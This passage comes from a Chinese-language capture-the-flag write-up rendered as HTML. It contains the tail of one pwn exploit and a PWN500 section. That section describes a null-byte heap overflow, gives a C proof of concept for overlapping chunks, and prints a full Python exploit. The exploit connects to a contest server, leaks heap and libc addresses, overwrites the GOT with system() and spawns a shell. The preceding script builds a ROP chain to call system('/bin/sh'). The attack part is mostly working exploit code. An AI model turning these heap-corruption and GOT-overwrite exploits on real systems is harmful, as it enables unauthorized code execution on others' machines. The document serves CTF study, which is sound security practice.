plain">adr_libc_start_main_ret&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python functions">int</code><code class="python plain">(io.rtl(</code><code class="python string">'R'</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">],&nbsp;</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">off_libc_start_main_ret&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x21ec5</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">libc_base&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_libc_start_main_ret&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">off_libc_start_main_ret</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">off_system&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00000000000468f0</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">adr_system&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">libc_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">off_system</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;libc&nbsp;base&nbsp;:&nbsp;0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">libc_base</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;system&nbsp;:&nbsp;0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">adr_system</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">adr_system</code></div><div class="line number34 index33 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">exp(adr_system):</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;io.wls([2,&nbsp;0x40,&nbsp;(('AAAAAAAA'&nbsp;+'%{}$lx\x00'.format(0x8b)).ljust(0x18,&nbsp;'a')&nbsp;+&nbsp;l64(p8_ret)).ljust(0x40,&nbsp;'a')])</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">1</code><code class="python plain">,&nbsp;</code><code class="python value">1</code><code class="python plain">,&nbsp;</code><code class="python value">11</code><code class="python plain">,&nbsp;</code><code class="python value">13</code><code class="python plain">])</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">2</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;((</code><code class="python string">'AAAAAAAA'</code>&nbsp;<code class="python keyword">+</code><code class="python string">'/bin/sh\x00'</code><code class="python plain">).ljust(</code><code class="python value">0x18</code><code class="python plain">,&nbsp;</code><code class="python string">'a'</code><code class="python plain">)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(p8_ret)).ljust(</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python string">'a'</code><code class="python plain">)])</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rtl(</code><code class="python string">'ciphertext:&nbsp;'</code><code class="python plain">)</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.r(</code><code class="python value">0x40</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">8</code><code class="python plain">)</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">heap_base&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(io.rl()[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].ljust(</code><code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python string">'\x00'</code><code class="python plain">))&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python value">0x270</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python value">0x450</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;heap&nbsp;base:&nbsp;0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">heap_base</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">3</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python string">'41'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x10</code><code class="python plain">])</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">xrange</code><code class="python plain">(</code><code class="python value">0x4</code><code class="python plain">):&nbsp;io.wls([</code><code class="python value">4</code><code class="python plain">,&nbsp;l64(heap_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">)])</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rop&nbsp;chain&nbsp;in&nbsp;stack</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">2</code><code class="python plain">,&nbsp;</code><code class="python value">0x20</code><code class="python plain">,&nbsp;(l64(pop_rdi_ret)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(heap_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(adr_system)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(entry)).ljust(</code><code class="python value">0x20</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)])</code></div><div class="line number46 index45 alt1"><code class="python plain">exp(leak())</code></div><div class="line number47 index46 alt2"><code class="python plain">io.itr()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN500</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>Bugs</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 在读取字符串时存在一个null的溢出，在读取package的内容时可溢出到下一个堆块</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 一些编程的逻辑漏洞，在save package时没有对package_head置零</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Thinking</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">程序开始时会malloc(0x20)用来存储sender，receiver，package链表的头结点地址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">malloc(0x98)存储sender的内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">malloc(0xb8)存储receiver的内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">malloc(len+0x18)存储package内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我采用的利用技巧是shrink free chunks，这个方法在<a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf" _src="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf">http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</a></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">中有介绍，最终的目标就是构造出overlapping chunks，这样，通过修改package的内容，来达到修改receiver的链表next和prev指针的目的</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之后就可以达到泄露heap和libc的目的，最后覆盖got表来get shell</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PoC of "shrinking free chunks"</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">*a,&nbsp;*b,&nbsp;*c,&nbsp;*d,&nbsp;*e,&nbsp;*f;</code></div><div class="line number2 index1 alt1"><code class="cpp plain">a&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x208);</code></div><div class="line number3 index2 alt2"><code class="cpp plain">b&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x208);</code></div><div class="line number4 index3 alt1"><code class="cpp plain">c&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x208);</code></div><div class="line number5 index4 alt2"><code class="cpp functions bold">free</code><code class="cpp plain">(b);</code></div><div class="line number6 index5 alt1"><code class="cpp plain">a[0x208]&nbsp;=&nbsp;0x0;</code></div><div class="line number7 index6 alt2"><code class="cpp plain">d&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x80);</code></div><div class="line number8 index7 alt1"><code class="cpp plain">e&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x80);</code></div><div class="line number9 index8 alt2"><code class="cpp functions bold">free</code><code class="cpp plain">(d);</code></div><div class="line number10 index9 alt1"><code class="cpp functions bold">free</code><code class="cpp plain">(c);</code></div><div class="line number11 index10 alt2"><code class="cpp plain">f&nbsp;=&nbsp;</code><code class="cpp functions bold">malloc</code><code class="cpp plain">(0x208);&nbsp;</code><code class="cpp comments">//&nbsp;f&nbsp;and&nbsp;e&nbsp;are&nbsp;overlapping&nbsp;chunks</code></div><div class="line number12 index11 alt1"><code class="cpp plain">```</code></div><div class="line number13 index12 alt2"><code class="cpp preprocessor">####&nbsp;Exploit</code></div><div class="line number14 index13 alt1"><code class="cpp plain">```python</code></div><div class="line number15 index14 alt2"><code class="cpp plain">from&nbsp;zio&nbsp;import&nbsp;*</code></div><div class="line number16 index15 alt1"><code class="cpp plain">io&nbsp;=&nbsp;zio((</code><code class="cpp string">'119.28.62.216'</code><code class="cpp plain">,&nbsp;10024),&nbsp;print_read&nbsp;=&nbsp;COLORED(RAW,&nbsp;</code><code class="cpp string">'red'</code><code class="cpp plain">),&nbsp;print_write&nbsp;=&nbsp;COLORED(RAW,&nbsp;</code><code class="cpp string">'blue'</code><code class="cpp plain">),&nbsp;timeout&nbsp;=&nbsp;100000)</code></div><div class="line number17 index16 alt2"><code class="cpp plain">io.hint([0x400e16])</code></div><div class="line number18 index17 alt1"><code class="cpp plain">adr_control&nbsp;=&nbsp;0x6030b8</code></div><div class="line number19 index18 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">'?'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'y'</code><code class="cpp plain">)</code></div><div class="line number20 index19 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'/bin/sh'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'BBBB'</code><code class="cpp plain">])</code></div><div class="line number21 index20 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number22 index21 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'BBBB'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'CCCC'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'DDDD'</code><code class="cpp plain">])</code></div><div class="line number23 index22 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'aaaa'</code><code class="cpp plain">])</code></div><div class="line number24 index23 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'aaaa'</code><code class="cpp plain">])</code></div><div class="line number25 index24 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'dddd'</code><code class="cpp plain">])</code></div><div class="line number26 index25 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;2])</code></div><div class="line number27 index26 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;1])</code></div><div class="line number28 index27 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'b'</code>&nbsp;<code class="cpp plain">*&nbsp;0x1f0])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;shrink&nbsp;</code><code class="cpp functions bold">free</code>&nbsp;<code class="cpp plain">chunk</code></div><div class="line number29 index28 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number30 index29 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number31 index30 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'BBBB'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'CCCC'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'DDDD'</code><code class="cpp plain">])</code></div><div class="line number32 index31 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number33 index32 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number34 index33 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'BBBB'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'CCCC'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'DDDD'</code><code class="cpp plain">])</code></div><div class="line number35 index34 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number36 index35 alt1"><code class="cpp preprocessor">#&nbsp;overlap</code></div><div class="line number37 index36 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[4,&nbsp;2])</code></div><div class="line number38 index37 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[4,&nbsp;1])</code></div><div class="line number39 index38 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number40 index39 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">])</code></div><div class="line number41 index40 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;1])</code></div><div class="line number42 index41 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'b'</code>&nbsp;<code class="cpp plain">*&nbsp;0x98&nbsp;+&nbsp;l64(0x0)&nbsp;+&nbsp;l64(0x81)&nbsp;+&nbsp;l64(adr_control&nbsp;-&nbsp;0x20)])</code></div><div class="line number43 index42 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number44 index43 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number45 index44 alt2"><code class="cpp plain">io.rtl(</code><code class="cpp string">'======receiver[2]======='</code><code class="cpp plain">)</code></div><div class="line number46 index45 alt1"><code class="cpp plain">io.rtl(</code><code class="cpp string">'postcodes:'</code><code class="cpp plain">)</code></div><div class="line number47 index46 alt2"><code class="cpp plain">heap_base&nbsp;=&nbsp;l64(io.rl()[0:-1].ljust(0x8,&nbsp;</code><code class="cpp string">'\x00'</code><code class="cpp plain">))&nbsp;-&nbsp;0x10</code></div><div class="line number48 index47 alt1"><code class="cpp plain">print&nbsp;</code><code class="cpp string">'[+]&nbsp;heap&nbsp;base\t:0x%x'</code>&nbsp;<code class="cpp plain">%&nbsp;heap_base</code></div><div class="line number49 index48 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number50 index49 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">])</code></div><div class="line number51 index50 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;0])</code></div><div class="line number52 index51 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'d'</code>&nbsp;<code class="cpp plain">*&nbsp;0x98&nbsp;+&nbsp;l64(0x0)&nbsp;+&nbsp;l64(0x81)&nbsp;+&nbsp;l64(0x603000&nbsp;-&nbsp;0x18)])</code></div><div class="line number53 index52 alt2"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number54 index53 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number55 index54 alt2"><code class="cpp plain">io.rtl(</code><code class="cpp string">'======receiver[3]======='</code><code class="cpp plain">)</code></div><div class="line number56 index55 alt1"><code class="cpp plain">io.rtl(</code><code class="cpp string">'contact:'</code><code class="cpp plain">)</code></div><div class="line number57 index56 alt2"><code class="cpp plain">adr_free&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;l64(io.r(6).ljust(0x8,&nbsp;</code><code class="cpp string">'\x00'</code><code class="cpp plain">))</code></div><div class="line number58 index57 alt1"><code class="cpp plain">off_free&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x0000000000083c30</code></div><div class="line number59 index58 alt2"><code class="cpp plain">off_read&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x00000000000ec690</code></div><div class="line number60 index59 alt1"><code class="cpp plain">off_puts&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x0000000000070c70</code></div><div class="line number61 index60 alt2"><code class="cpp plain">off_malloc&nbsp;&nbsp;=&nbsp;0x0000000000083590</code></div><div class="line number62 index61 alt1"><code class="cpp plain">libc_base&nbsp;&nbsp;&nbsp;=&nbsp;adr_free&nbsp;-&nbsp;off_free</code></div><div class="line number63 index62 alt2"><code class="cpp plain">off_system&nbsp;&nbsp;=&nbsp;0x00000000000468f0</code></div><div class="line number64 index63 alt1"><code class="cpp plain">adr_system&nbsp;&nbsp;=&nbsp;off_system&nbsp;+&nbsp;libc_base</code></div><div class="line number65 index64 alt2"><code class="cpp plain">adr_puts&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;off_puts&nbsp;+&nbsp;libc_base</code></div><div class="line number66 index65 alt1"><code class="cpp plain">adr_read&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;off_read&nbsp;+&nbsp;libc_base</code></div><div class="line number67 index66 alt2"><code class="cpp plain">adr_malloc&nbsp;&nbsp;=&nbsp;off_malloc&nbsp;+&nbsp;libc_base</code></div><div class="line number68 index67 alt1"><code class="cpp plain">print&nbsp;</code><code class="cpp string">'[+]&nbsp;free&nbsp;address\t:0x%x'</code>&nbsp;<code class="cpp plain">%&nbsp;adr_free</code></div><div class="line number69 index68 alt2"><code class="cpp plain">print&nbsp;</code><code class="cpp string">'[+]&nbsp;system&nbsp;address\t:0x%x'</code>&nbsp;<code class="cpp plain">%&nbsp;adr_system</code></div><div class="line number70 index69 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;2)</code></div><div class="line number71 index70 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[1,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">,&nbsp;</code><code class="cpp string">'AAAA'</code><code class="cpp plain">])</code></div><div class="line number72 index71 alt1"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;0])</code></div><div class="line number73 index72 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[2,&nbsp;0x1f0,&nbsp;</code><code class="cpp string">'d'</code>&nbsp;<code class="cpp plain">*&nbsp;0x98&nbsp;+&nbsp;l64(0x0)&nbsp;+&nbsp;l64(0x81)&nbsp;+&nbsp;l64(heap_base)])</code></div><div class="line number74 index73 alt1"><code class="cpp plain">io.wl_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;5)</code></div><div class="line number75 index74 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;4]),</code></div><div class="line number76 index75 alt1"><code class="cpp plain">io.w(l64(0x603008)&nbsp;+&nbsp;l64(heap_base&nbsp;+&nbsp;0x40)[0:7]&nbsp;+&nbsp;</code><code class="cpp string">'\n'</code>&nbsp;<code class="cpp plain">+&nbsp;</code><code class="cpp string">'B'</code>&nbsp;<code class="cpp plain">*&nbsp;0x8&nbsp;+&nbsp;</code><code class="cpp string">'C'</code>&nbsp;<code class="cpp plain">*&nbsp;0x38)</code></div><div class="line number77 index76 alt2"><code class="cpp plain">io.wls_af(</code><code class="cpp string">':'</code><code class="cpp plain">,&nbsp;[3,&nbsp;0])</code></div><div class="line number78 index77 alt1"><code class="cpp plain">io.w(l64(adr_system)[0:7]&nbsp;+&nbsp;</code><code class="cpp string">'\n'</code>&nbsp;<code class="cpp plain">+&nbsp;l64(adr_puts)[0:7]&nbsp;+&nbsp;</code><code class="cpp string">'\n'</code>&nbsp;<code class="cpp plain">+&nbsp;l64(adr_read)[0:7]&nbsp;+&nbsp;</code><code class="cpp string">'\n'</code>&nbsp;<code class="cpp plain">+&nbsp;l64(adr_malloc)&nbsp;+&nbsp;</code><code class="cpp string">'D'</code>&nbsp;<code class="cpp plain">*&nbsp;0x20&nbsp;+&nbsp;l64(adr_system)[0:7]&nbsp;+&nbsp;</code><code class="cpp string">'\n'</code><code class="cpp plain">)</code></div><div class="line number79 index78 alt2"><code class="cpp plain">io.wl(</code><code class="cpp string">'sh'</code><code class="cpp plain">)</code></div><div class="line number80 index79 alt1"><code class="cpp plain">io.wl(</code><code class="cpp string">'6'</code><code class="cpp plain">)</code></div><div class="line number81 index80 alt2"><code class="cpp plain">io.itr()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">Misc</span></strong></p><hr><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">moblie 100</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft 